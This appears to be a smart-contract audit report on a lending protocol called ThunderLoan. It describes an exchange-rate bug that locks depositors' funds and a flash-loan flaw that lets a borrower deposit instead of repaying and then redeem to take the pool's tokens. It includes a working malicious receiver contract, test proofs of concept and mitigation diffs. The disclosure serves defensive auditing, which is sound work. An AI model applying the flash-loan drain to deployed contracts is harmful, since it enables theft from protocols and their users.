[H-1] Incorrect Exchange Rate Update in `ThunderLoan::deposit` Function

Description: The `ThunderLoan::deposit` function in the protocol has an issue related to the improper updating of the asset token's exchange rate, which leads to incorrect redemption behavior. The exchange rate is updated within the deposit function even if no one yet took a flash one and deposited some fees into the protocol.

For example, if an LP deposits `ERC20` tokens with an exchange rate of 1 (1 asset token for 1 underlying token), the incorrect update may cause the exchange rate to shift improperly. This shift impacts the calculation of the underlying tokens during the redemption process, locking the LP to redeem back his funds.

Impact: This bug is `high` severity because it directly impacts the core functionality of the protocol—accurate deposit and redemption of tokens. Users are unable to correctly redeem their underlying tokens after depositing. This can result in locked funds that LP can't pull out.

Proof of Concept: Add the following test case in `ThunderLoanTest.t.sol` that proves the issue

1. The mock tokenA is added to the allowedTokens list
2. The LP deposits 1000e18 of tokenA and gets 1000e18 asset tokens in exchange since the exchange rate is 1 (1 UnderlyingToken = 1 AssetToken)
3. After minting the exchange rate is updated to `1.003.000.000.000.000.000`
4. LP tries to reedem all of his assetTokens and get back the underlying token, but since the amount of underlying tokens that needs to be returned back to the LP relies on the exchange rate - they are calculated not properly which leads to `ERC20InsufficientBalance` error since the asset token contract has not that much underlying tokens to give back


```javascript
    function testRedeemWrongUpdateOfExchangeFee() public setAllowedToken hasDeposits {
        // LP deposits 1000 tokenA
        // LP gets 1000 assetToken due to the exchange rate = 1
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        
        uint256 initialBalanceOfAssetTokensAfterDeposit = assetToken.balanceOf(liquidityProvider);
        uint256 initialBalanceOfUnderlyingTokensAfterDeposit = tokenA.balanceOf(liquidityProvider);

        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, type(uint256).max); // e redeem all asset tokens of the luqiudity provider

        // assert(assetToken.balanceOf(liquidityProvider) == totalAssetTokensAfterDeposit - DEPOSIT_AMOUNT);
        // assert(tokenA.balanceOf(liquidityProvider) == initialBalanceOfUnderlyingTokensAfterDeposit + DEPOSIT_AMOUNT);
    }
```

Recommended Mitigation:

1. Do not update the exchange rate inside the `ThunderLoan::deposit` function

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        fee and totalSupply of the asset token
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        
        emit Deposit(msg.sender, token, amount);
        
        assetToken.mint(msg.sender, mintAmount);
        
-       uint256 calculatedFee = getCalculatedFee(token, amount);
        
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

[H-2] Flash Loan Abuse Vulnerability (Reentrancy + Improper Repayment Handling)

Description: A critical vulnerability exists in the flash loan functionality. The issue arises due to the combination of the flash loan process and the interaction with the `ThunderLoan::deposit` and `ThunderLoan::redeem` functions. Specifically, a malicious user can take out a flash loan and instead of repaying the borrowed tokens, call the `ThunderLoan::deposit` function to transfer the flash-loaned tokens to the AssetToken contract. This satisfies the condition of the flash loan check, as the AssetToken staring and ending balance are the same. However, the user receives asset tokens in return, which can later be redeemed for the underlying tokens, effectively bypassing the repayment requirement.

Impact:
1. The protocol suffers financial loss as the borrowed flash loan is not truly repaid; instead, the attacker retains access to the underlying assets.
2. The attacker can repeat the exploit, continuously draining the protocol's liquidity and leading to insolvency.

Proof of Concept: The issue is proved in the following test case inside `ThunderLoanTest.t.sol`

1. TokenA is set as allowed token
2. Liquidity Provider user deposits 1000e18 underlying(tokenA) tokens to the ThunderLoan protocol
3. Malicious user creates a `MaliciousDepositFlashLoanReceiver` contract with the `executeOperation` function calling `deposit` instead of `repay` and calling the `flashloan` function which gives 100e18 underlying(tokenA) tokens to the
receiver contract, which instead of repaying doing a deposit, which gives back the loan to the asset token, but also receiver contracts takes asset tokens in return.
4. Receiver contract uses the asset tokens to call `redeem` function and take back the underlying(tokenA) tokens

```javascript

    function testDepositInsteadOfRepayOnFlashLoan() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        MaliciousDepositFlashLoanReceiver receiverContract = new MaliciousDepositFlashLoanReceiver(address(thunderLoan));
        uint256 initialBalanceOfTokenAReceiver = tokenA.balanceOf(address(receiverContract));
        uint256 flashloanAmount = 100e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, flashloanAmount);

        // mint some tokenA to the receiver contract so he can pays the fee
        tokenA.mint(address(receiverContract), fee);

        // user A takes a flash loan of 100e18 tokenA, but in the executeOperation function of the receiver contract
        // we are calling deposit instead of repay which retrievs the balance of thunderLoan but mints ~99.970 ASSET tokens to the receiver contract
        thunderLoan.flashloan(address(receiverContract), tokenA, flashloanAmount, "");
        vm.stopPrank();

        vm.startPrank(address(receiverContract));
        // here we burning all of the asset tokens that we recieved from the flash loan (in deposit function)
        // and we get back the underlying tokenA
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        uint256 endingBalanceOfTokenAReceiver = tokenA.balanceOf(address(receiverContract));

        // the receiver contract stole all the money from the flash loan
        assert(endingBalanceOfTokenAReceiver > initialBalanceOfTokenAReceiver + flashloanAmount + fee);
    }

    contract MaliciousDepositFlashLoanReceiver is IFlashLoanReceiver {
        ThunderLoan thunderLoan;

        constructor(address _thunderLoan) {
            thunderLoan = ThunderLoan(_thunderLoan);
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address /* initiator */,
            bytes memory /* params */
        )
            external
            returns (bool) {
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.deposit(IERC20(token), amount + fee);

            return true;
    }
}
```

Recommended Mitigation: Possbile mitigation for this issue is to rely on `s_currentlyFlashLoaning` state variable
by checking if the flash loan process is active. If it's active the user won't be able to deposit at this time.


```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+       if (isCurrentlyFlashLoaning(token)) {
+          revert ThunderLoan__CurrentlyFlashLoaning(token);
+       }
        // e get the asset token contract based on the underlying token
        AssetToken assetToken = s_tokenToAssetToken[token];
        // e get it's assetToken exchange rate - which is calculated based on the fee and totalSupply of the asset token
        uint256 exchangeRate = assetToken.getExchangeRate();
        // e calculate how much assets tokens should be minted for the user based on the exchange rate and the amount user wants to deposit
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        // e emit the deposit event
        emit Deposit(msg.sender, token, amount);
        // e mint the calculated asset tokens to the user
        assetToken.mint(msg.sender, mintAmount);
        // e calculate the new exchange rate based on the token price and amount user deposited
        uint256 calculatedFee = getCalculatedFee(token, amount);
        // e update the exchange rate
        // @audit-high - this unnessrayly updates the exchange rate which causes an issue in the redeem function
        assetToken.updateExchangeRate(calculatedFee);
        // transfer the token with the specified deposited amount to the asset token
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```